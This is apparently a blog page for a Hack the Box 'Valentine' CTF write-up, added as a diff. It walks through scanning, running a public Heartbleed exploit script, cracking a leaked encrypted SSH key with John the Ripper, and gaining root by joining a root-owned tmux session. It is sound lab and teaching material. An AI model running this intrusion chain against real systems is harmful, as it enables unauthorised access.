@@ -1,0 +1,809 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+    <!-- Document Settings -->
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <!-- Base Meta -->
+    <!-- dynamically fixing the title for tag/author pages -->
+
+
+
+    <title>Valentine Writeup</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!-- Styles'n'Scripts -->
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />
+    <!-- highlight.js -->
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
+    <style>.hljs { background: none; }</style>
+
+    <!--[if IE]>
+        <style>
+            p, ol, ul{
+                width: 100%;
+            }
+            blockquote{
+                width: 100%;
+            }
+        </style>
+    <![endif]-->
+    
+    <!-- This tag outputs SEO meta+structured data and other important settings -->
+    <meta name="description" content="Security researching from the nordics" />
+    <link rel="shortcut icon" href="/assets/images/static/blog-icon.png" type="image/png" />
+    <link rel="canonical" href="/valentine-writeup" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+
+     <!--title below is coming from _includes/dynamic_title-->
+    <meta property="og:site_name" content="Securityits.io" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Valentine Writeup" />
+    <meta property="og:description" content="Heartbleeds and dirty cows, i feel sorry for the creator! Connecting to Hack the Box1 using the supplied VPN, my Valentine box have the IP: 10.10.10.79 As per usual, lets start with Recon and NMAP the target IP root@kali:~/Valentine$ nmap -p- --version-all -sV -sS 10.10.10.79 Starting Nmap 7.60 ( https://nmap.org" />
+    <meta property="og:url" content="/valentine-writeup" />
+    <meta property="og:image" content="/assets/images/posts/2018/07/valentine-writeup/valentine-banner.jpg" />
+    <meta property="article:publisher" content="https://www.facebook.com/false" />
+    <meta property="article:author" content="https://www.facebook.com/false" />
+    <meta property="article:published_time" content="2018-07-27T00:00:00+00:00" />
+    <meta property="article:modified_time" content="2018-07-27T00:00:00+00:00" />
+    <meta property="article:tag" content="Ctf" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Valentine Writeup" />
+    <meta name="twitter:description" content="Heartbleeds and dirty cows, i feel sorry for the creator! Connecting to Hack the Box1 using the supplied VPN, my Valentine box have the IP: 10.10.10.79 As per usual, lets start with Recon and NMAP the target IP root@kali:~/Valentine$ nmap -p- --version-all -sV -sS 10.10.10.79 Starting Nmap 7.60 ( https://nmap.org" />
+    <meta name="twitter:url" content="/" />
+    <meta name="twitter:image" content="/assets/images/posts/2018/07/valentine-writeup/valentine-banner.jpg" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Securityits.io" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="Ctf" />
+    <meta name="twitter:site" content="@Securitybits_io" />
+    <meta name="twitter:creator" content="@Securitybits_io" />
+    <meta property="og:image:width" content="1400" />
+    <meta property="og:image:height" content="933" />
+
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Website",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Securityits.io",
+        "logo": "/assets/images/static/blog-icon.png"
+    },
+    "url": "/valentine-writeup",
+    "image": {
+        "@type": "ImageObject",
+        "url": "/assets/images/posts/2018/07/valentine-writeup/valentine-banner.jpg",
+        "width": 2000,
+        "height": 666
+    },
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "/valentine-writeup"
+    },
+    "description": "Heartbleeds and dirty cows, i feel sorry for the creator! Connecting to Hack the Box1 using the supplied VPN, my Valentine box have the IP: 10.10.10.79 As per usual, lets start with Recon and NMAP the target IP root@kali:~/Valentine$ nmap -p- --version-all -sV -sS 10.10.10.79 Starting Nmap 7.60 ( https://nmap.org"
+}
+    </script>
+
+    <!-- <script type="text/javascript" src="https://demo.ghost.io/public/ghost-sdk.min.js?v=724281a32e"></script>
+    <script type="text/javascript">
+    ghost.init({
+    	clientId: "ghost-frontend",
+    	clientSecret: "f84a07a72b17"
+    });
+    </script> -->
+
+    <meta name="generator" content="Jekyll 3.6.2" />
+    <link rel="alternate" type="application/rss+xml" title="Valentine Writeup" href="/feed.xml" />
+
+
+</head>
+<body class="post-template">
+
+    <div class="site-wrapper">
+        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
+        <!-- default -->
+
+<!-- The tag above means: insert everything in this file
+into the {body} of the default.hbs template -->
+
+<header class="site-header outer">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left">
+        
+            
+                <a class="site-nav-logo" href="/"><img src="/assets/images/static/blog-icon.png" alt="Securityits.io" /></a>
+            
+        
+        
+            <ul class="nav" role="menu">
+    <li class="nav-home" role="menuitem"><a href="/">Home</a></li>
+    <li class="nav-about" role="menuitem"><a href="/about/">About</a></li>
+    <li class="nav-github" role="menuitem"><a href="https://github.com/securitybits-io">Github</a></li>
+</ul>
+
+        
+    </div>
+    <div class="site-nav-right">
+        <div class="social-links">
+            
+            
+                <a class="social-link social-link-tw" href="https://twitter.com/Securitybits_io" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+</a>
+            
+        </div>
+        
+    </div>
+</nav>
+
+    </div>
+</header>
+
+<!-- Everything inside the #post tags pulls data from the post -->
+<!-- #post -->
+
+<main id="site-main" class="site-main outer" role="main">
+    <div class="inner">
+
+        <article class="post-full  tag-ctf post ">
+
+            <header class="post-full-header">
+                <section class="post-full-meta">
+                    <time class="post-full-meta-date" datetime="27 July 2018">27 July 2018</time>
+                    
+                        <span class="date-divider">/</span>
+                        
+                            
+                               <a href='/tag/ctf/'>CTF</a>
+                            
+                        
+                    
+                </section>
+                <h1 class="post-full-title">Valentine Writeup</h1>
+            </header>
+
+            
+            <figure class="post-full-image" style="background-image: url(/assets/images/posts/2018/07/valentine-writeup/valentine-banner.jpg)">
+            </figure>
+            
+
+            <section class="post-full-content">
+                <div class="kg-card-markdown">
+                    <blockquote>
+  <p>Heartbleeds and dirty cows, i feel sorry for the creator!</p>
+</blockquote>
+
+<p>Connecting to Hack the Box<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup> using the supplied VPN, my Valentine box have the IP: 10.10.10.79
+As per usual, lets start with Recon and NMAP the target IP</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Valentine$ nmap -p- --version-all -sV -sS 10.10.10.79
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-02 22:27 CET
+Nmap scan report for 10.10.10.79
+Host is up (0.049s latency).
+Not shown: 65532 closed ports
+PORT      STATE  SERVICE   VERSION
+22/tcp    open   ssh       OpenSSH 5.9p1 Debian 5ubuntu1.10
+80/tcp    open   http      Apache httpd 2.2.22 ((Ubuntu))
+443/tcp   open   ssl/http  Apache httpd 2.2.22 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 51.78 seconds
+</code></pre></div></div>
+
+<p>So we are dealing with some kind of webserver.
+The root directory of the address is only displaying an image on both webports (80/443), next step would be trying to enumerate directories!</p>
+
+<p><img src="assets/images/posts/2018/07/valentine-writeup/omg-1.jpg" alt="Valentine root image" /></p>
+
+<p>I usually use the tool “gobuster” to enumerate webdirectories with a wordlist, and point it to Burpsuite Proxy. That way, any link or directory that gobuster finds, will Burpsuite automatically spider as well as record in its console.<br />
+So lets point gobuster towards the webserver and let it run in the background.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Valentine$ gobuster -u http://10.10.10.79 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -p 127.0.0.1:8080 -x php
+</code></pre></div></div>
+
+<p>Now sticking with the theme Valentine, the image is referencing the exploit Heartbleed<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup> which targets SSL (port 443). its also available on ExploitDB, therefor there’s a local variant in kali. You might though have to run this a couple times to get the data that’s relevant.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Valentine$ searchsploit heartbleed
+root@kali:~/Valentine$ cp /usr/share/exploitdb/exploits/multiple/remote/32764.py .
+root@kali:~/Valentine$ python 32764.py 10.10.10.79 &gt; heartbleed.txt
+root@kali:~/Valentine$ cat heartbleed.txt
+[..snip..]
+00f0: 01 00 00 00 10 00 0E 00 00 0B 31 30 2E 31 30 2E ..........10.10.
+0100: 31 30 2E 37 39 6F 6E 2F 78 2D 77 77 77 2D 66 6F 10.79on/x-www-fo
+0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43 rm-urlencoded..C
+0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34 ontent-Length: 4
+0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63 2....$text=aGVhc
+0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64 nRibGVlZGJlbGlld
+0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 43 mV0aGVoeXBlCg==C
+0160: 05 16 1F AC BA A4 D1 E0 45 10 F2 B0 B6 9E 4B 30 ........E.....K0
+0170: 01 06 7D 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C ..}.............
+0180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+[..snip..]
+</code></pre></div></div>
+
+<p>Now that $text parameter in the response looks like a base64 encoded string.<br />
+$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Valentine$ echo 'aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==' | base64 -d
+heartbleedbelievethehype
+</code></pre></div></div>
+
+<p>Lets save that to the notes and pop back to see what the result of gobuster is up to.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Gobuster v1.2                OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.79/
+[+] Threads      : 200
+[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Status codes : 302,307,200,204,301
+[+] Proxy        : 127.0.0.1:8080
+[+] Extensions   : .php
+=====================================================
+/index (Status: 200)
+/index.php (Status: 200)
+/dev (Status: 301)
+/encode (Status: 200)
+/encode.php (Status: 200)
+/decode (Status: 200)
+/decode.php (Status: 200)
+/omg (Status: 200)
+=====================================================
+</code></pre></div></div>
+
+<p>So encode and decode just seems to be two php functions that does what they say to base64 strings. They didn’t seems that vulnerable to command injections either. But /dev looks interesting , browsing to that reveals two files.</p>
+
+<p><img src="assets/images/posts/2018/07/valentine-writeup/Valentine_Slash_dev.png" alt="Valentine_Slash_dev" /></p>
+
+<p>Taking a peek at notes.txt shows a checklist.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>To do:
+
+1) Coffee.
+2) Research.
+3) Fix decoder/encoder before going live.
+4) Make sure encoding/decoding is only done client-side.
+5) Don't use the decoder/encoder until any of this is done.
+6) Find a better way to take notes.
+</code></pre></div></div>
+
+<p>The file hype_key contains an ASCII encoded SSH Private Key, so download that and pipe it to xxd.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Valentine$ cat hype_key | xxd -r -p &gt; rsa.encrypted
+root@kali:~/Valentine$ cat rsa.encrypted
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46
+
+DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
+[..super snip..]
+RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
+-----END RSA PRIVATE KEY-----
+</code></pre></div></div>
+
+<p>According to Proc-Type its encrypted, so next step would be to decrypt it using JohnTheRipper!<br />
+First lets create a JTR compatible file to crack, then remembering the decoded base64 string before, might be the password.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Valentine$ ssh2john rsa.encrypted &gt; rsa.john
+root@kali:~/Valentine$ echo "heartbleedbelievethehype" | john --stdin rsa.johnssh
+</code></pre></div></div>
+
+<p>That should successfully crack the Private Key!<br />
+Now we only need to change the permissions and try to connect, what we’re missing is the username to connect with, but reading the private keys filename “hype_key”, we can always try “hype”.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Valentine$ chmod 0600 rsa.encrypted
+root@kali:~/Valentine$ ssh -i rsa.encrypted hype@10.10.10.79
+Enter passphrase for key 'rsa.encrypted': heartbleedbelievethehype
+Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)
+New release '14.04.5 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
+hype@Valentine:~$
+</code></pre></div></div>
+
+<p>So that takes care of the initial shell, now lets enumerate the system and see what we can find out to Privilege Escalate to root!<br />
+G0tmi1k<sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote" rel="footnote">3</a></sup> Has a really good cheat sheets in how to enumerate linux systems!<br />
+So lets do some basic things.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hype@Valentine:~$ uname -a
+Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
+</code></pre></div></div>
+
+<p>So having a kernel means that it might be vulnerable to the Dirtycow<sup id="fnref:4" role="doc-noteref"><a href="#fn:4" class="footnote" rel="footnote">4</a></sup> exploit.<br />
+But generally using such exploit is frowned upon since it might crash the box and ruin the day for other people.<br />
+So lets continue enumerating and hope we find something else.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hype@Valentine:~$ history
+.....snip....
+8 ls -la
+9 tmux -L dev_sess
+10 tmux a -t dev_sess
+11 tmux --help
+12 tmux -S /.devs/dev_sess
+13 exit
+.....snip....
+</code></pre></div></div>
+
+<p>Now running history shows that there’s a tmux session (item 12) hype connected to, and running <code class="language-plaintext highlighter-rouge">ps -aux</code> to check all running processes also shows that the tmux session is running as root.<br />
+Lets connect to the same session.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hype@Valentine:~$ !12
+root@Valentine:/home/hype# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div></div>
+
+<p>Done!</p>
+
+<div class="footnotes" role="doc-endnotes">
+  <ol>
+    <li id="fn:1" role="doc-endnote">
+      <p><a href="www.hackthebox.eu">www.hackthebox.eu</a> <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:2" role="doc-endnote">
+      <p><a href="http://heartbleed.com/">www.heartbleed.com</a> <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:3" role="doc-endnote">
+      <p><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">Basic Linux Privilege Escalation</a> <a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:4" role="doc-endnote">
+      <p><a href="https://dirtycow.ninja">www.dirtycow.ninja</a> <a href="#fnref:4" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+  </ol>
+</div>
+
+                </div>
+            </section>
+
+            <!-- Email subscribe form at the bottom of the page -->
+            
+
+            <footer class="post-full-footer">
+                <!-- Everything inside the #author tags pulls data from the author -->
+                <!-- #author-->
+                
+                    
+                        <section class="author-card">
+                            
+                                <img class="author-profile-image" src="/assets/images/pages/profile/christoffer/profile.jpg" alt="christoffer" />
+                            
+                            <section class="author-card-content">
+                                <h4 class="author-card-name"><a href="/author/christoffer">Christoffer Claesson</a></h4>
+                                
+                                    <p>I am Christoffer Claesson, a professional security researcher from Sweden who spends his days (and many nights) on red teaming, security deep dives, and homelab experiments. This blog is my way of giving back to the community by sharing lessons, notes, and the occasional side project that grew bigger than planned.</p>
+                                
+                            </section>
+                        </section>
+                        <div class="post-full-footer-right">
+                            <a class="author-card-button" href="/author/christoffer">Read More</a>
+                        </div>
+                    
+                
+                <!-- /author  -->
+            </footer>
+
+            <!-- If you use Disqus comments, just uncomment this block.
+            The only thing you need to change is "test-apkdzgmqhj" - which
+            should be replaced with your own Disqus site-id. -->
+            
+
+        </article>
+
+    </div>
+</main>
+
+<!-- Links to Previous/Next posts -->
+<aside class="read-next outer">
+    <div class="inner">
+        <div class="read-next-feed">
+            
+                
+                
+                
+                
+                    <article class="read-next-card"
+                        
+                            style="background-image: url(/assets/images/static/blog-cover.jpg)"
+                        
+                    >
+                        <header class="read-next-card-header">
+                            <small class="read-next-card-header-sitetitle">&mdash; Securityits.io &mdash;</small>
+                            
+                                <h3 class="read-next-card-header-title"><a href="/tag/ctf/">Ctf</a></h3>
+                            
+                        </header>
+                        <div class="read-next-divider"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 14.5s2 3 5 3 5.5-2.463 5.5-5.5S21 6.5 18 6.5c-5 0-7 11-12 11C2.962 17.5.5 15.037.5 12S3 6.5 6 6.5s4.5 3.5 4.5 3.5"/></svg>
+</div>
+                        <div class="read-next-card-content">
+                            <ul>
+                                
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                            <li><a href="/reverse-engineering-an-unknown-digital-protocol">Reverse Engineering an unknown digital protocol: RHME2, Whac a mole</a></li>
+                                        
+                                    
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                
+                                  
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                            <li><a href="/falafel-writeup">Falafel Writeup</a></li>
+                                        
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                            <li><a href="/chatterbox-writeup">Chatterbox Writeup</a></li>
+                                        
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                    
+                                  
+                                
+                                  
+                                    
+                                        
+                                        
+                                    
+                                  
+                                
+                                  
+                                
+                            </ul>
+                        </div>
+                        <footer class="read-next-card-footer">
+                            <a href="/tag/ctf/">
+                                
+                                    See all 5 posts  →
+                                
+                            </a>
+                        </footer>
+                    </article>
+                
+            
+
+            <!-- If there's a next post, display it using the same markup included from - partials/post-card.hbs -->
+            
+                
+
+    <article class="post-card post-template">
+        
+            <a class="post-card-image-link" href="/fault-injection-powerglitching-on-the-cheap">
+                <div class="post-card-image" style="background-image: url(/assets/images/posts/2019/06/voltage-glitching-on-the-cheap/pexels-photo-132700.jpeg)"></div>
+            </a>
+        
+        <div class="post-card-content">
+            <a class="post-card-content-link" href="/fault-injection-powerglitching-on-the-cheap">
+                <header class="post-card-header">
+                    
+                        
+                            
+                               <span class="post-card-tags">Hardware</span>
+                            
+                        
+                            
+                                <span class="post-card-tags">Security</span>
+                            
+                        
+                    
+
+                    <h2 class="post-card-title">Voltage glitching on the cheap</h2>
+                </header>
+                <section class="post-card-excerpt">
+                    
+                        <p>
+  Stand back! We’re doing science! voltage glitching on an Arduino
+
+
+</p>
+                    
+                </section>
+            </a>
+            <footer class="post-card-meta">
+                
+                    
+                        
+                        <img class="author-profile-image" src="/assets/images/pages/profile/christoffer/profile.jpg" alt="Christoffer Claesson" />
+                        
+                        <span class="post-card-author">
+                            <a href="/author/christoffer/">Christoffer Claesson</a>
+                        </span>
+                    
+                
+                <span class="reading-time">
+                    
+                    
+                      4 min read
+                    
+                </span>
+            </footer>
+        </div>
+    </article>
+
+            
+
+            <!-- If there's a previous post, display it using the same markup included from - partials/post-card.hbs -->
+            
+                
+
+    <article class="post-card post-template">
+        
+            <a class="post-card-image-link" href="/falafel-writeup">
+                <div class="post-card-image" style="background-image: url(/assets/images/posts/2018/06/falafel-writeup/HTB-Falafel-blog-post.jpg)"></div>
+            </a>
+        
+        <div class="post-card-content">
+            <a class="post-card-content-link" href="/falafel-writeup">
+                <header class="post-card-header">
+                    
+                        
+                            
+                                <span class="post-card-tags">Ctf</span>
+                            
+                        
+                    
+
+                    <h2 class="post-card-title">Falafel Writeup</h2>
+                </header>
+                <section class="post-card-excerpt">
+                    
+                        <p>
+  My writeup of the Hack the box Falafel.
+
+
+</p>
+                    
+                </section>
+            </a>
+            <footer class="post-card-meta">
+                
+                    
+                        
+                        <img class="author-profile-image" src="/assets/images/pages/profile/christoffer/profile.jpg" alt="Christoffer Claesson" />
+                        
+                        <span class="post-card-author">
+                            <a href="/author/christoffer/">Christoffer Claesson</a>
+                        </span>
+                    
+                
+                <span class="reading-time">
+                    
+                    
+                      7 min read
+                    
+                </span>
+            </footer>
+        </div>
+    </article>
+
+            
+
+        </div>
+    </div>
+</aside>
+
+<!-- Floating header which appears on-scroll, included from includes/floating-header.hbs -->
+<div class="floating-header">
+    <div class="floating-header-logo">
+        <a href="/">
+            
+                <img src="/assets/images/static/blog-icon.png" alt="Securityits.io icon" />
+            
+            <span>Securityits.io</span>
+        </a>
+    </div>
+    <span class="floating-header-divider">&mdash;</span>
+    <div class="floating-header-title">Valentine Writeup</div>
+    <div class="floating-header-share">
+        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"/>
+</svg>
+</div>
+        <a class="floating-header-share-tw" href="https://twitter.com/share?text=Valentine+Writeup&amp;url=https://jekyllt.github.io/jasper2/valentine-writeup"
+            onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+
+        </a>
+        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://jekyllt.github.io/jasper2/valentine-writeup"
+            onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M19 6h5V0h-5c-3.86 0-7 3.14-7 7v3H8v6h4v16h6V16h5l1-6h-6V7c0-.542.458-1 1-1z"/></svg>
+
+        </a>
+    </div>
+    <progress class="progress" value="0">
+        <div class="progress-container">
+            <span class="progress-bar"></span>
+        </div>
+    </progress>
+</div>
+
+
+<!-- /post -->
+
+<!-- The #contentFor helper here will send everything inside it up to the matching #block helper found in default.hbs -->
+
+
+        <!-- Previous/next page links - displayed on every page -->
+        
+
+        <!-- The footer at the very bottom of the screen -->
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="/">Securityits.io</a> &copy; 2025</section>
+                <section class="poweredby">Proudly published with <a href="https://jekyllrb.com/">Jekyll</a> &
+                    <a href="https://pages.github.com/" target="_blank" rel="noopener">GitHub Pages</a> using
+                    <a href="https://github.com/jekyllt/jasper2" target="_blank" rel="noopener">Jasper2</a></section>
+                <nav class="site-footer-nav">
+                    <a href="/">Latest Posts</a>
+                    
+                    <a href="https://twitter.com/Securitybits_io" target="_blank" rel="noopener">Twitter</a>
+                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
+                </nav>
+            </div>
+        </footer>
+
+    </div>
+
+    <!-- The big email subscribe modal content -->
+    
+
+    <!-- highlight.js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.10.0/components/prism-abap.min.js"></script>
+    <script>$(document).ready(function() {
+      $('pre code').each(function(i, block) {
+        hljs.highlightBlock(block);
+      });
+    });</script>
+
+    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
+    <script
+        src="https://code.jquery.com/jquery-3.2.1.min.js"
+        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+        crossorigin="anonymous">
+    </script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
+    <script type="text/javascript" src="https://demo.ghost.io/assets/js/jquery.fitvids.js?v=724281a32e"></script>
+
+
+    <!-- Paginator increased to "infinit" in _config.yml -->
+    <!-- if paginator.posts  -->
+    <!-- <script>
+        var maxPages = parseInt('');
+    </script>
+    <script src="/assets/js/infinitescroll.js"></script> -->
+    <!-- /endif -->
+
+    
+
+
+    <!-- Add Google Analytics  -->
+    <!-- Google Analytics Tracking code -->
+ <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-115328400-1', 'auto');
+  ga('send', 'pageview');
+
+ </script>
+
+
+    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
+    
+        <script>
+
+// NOTE: Scroll performance is poor in Safari
+// - this appears to be due to the events firing much more slowly in Safari.
+//   Dropping the scroll event and using only a raf loop results in smoother
+//   scrolling but continuous processing even when not scrolling
+$(document).ready(function () {
+    // Start fitVids
+    var $postContent = $(".post-full-content");
+    $postContent.fitVids();
+    // End fitVids
+
+    var progressBar = document.querySelector('progress');
+    var header = document.querySelector('.floating-header');
+    var title = document.querySelector('.post-full-title');
+
+    var lastScrollY = window.scrollY;
+    var lastWindowHeight = window.innerHeight;
+    var lastDocumentHeight = $(document).height();
+    var ticking = false;
+
+    function onScroll() {
+        lastScrollY = window.scrollY;
+        requestTick();
+    }
+
+    function onResize() {
+        lastWindowHeight = window.innerHeight;
+        lastDocumentHeight = $(document).height();
+        requestTick();
+    }
+
+    function requestTick() {
+        if (!ticking) {
+            requestAnimationFrame(update);
+        }
+        ticking = true;
+    }
+
+    function update() {
+        var trigger = title.getBoundingClientRect().top + window.scrollY;
+        var triggerOffset = title.offsetHeight + 35;
+        var progressMax = lastDocumentHeight - lastWindowHeight;
+
+        // show/hide floating header
+        if (lastScrollY >= trigger + triggerOffset) {
+            header.classList.add('floating-active');
+        } else {
+            header.classList.remove('floating-active');
+        }
+
+        progressBar.setAttribute('max', progressMax);
+        progressBar.setAttribute('value', lastScrollY);
+
+        ticking = false;
+    }
+
